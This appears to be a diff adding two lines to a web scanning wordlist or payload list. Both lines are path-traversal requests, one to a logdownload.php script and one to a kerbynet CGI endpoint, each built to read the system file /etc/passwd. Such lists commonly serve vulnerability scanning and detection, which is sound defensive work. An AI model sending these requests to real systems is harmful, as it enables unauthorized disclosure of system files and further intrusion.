@@ -1,0 +1,2 @@
+/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
+/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd
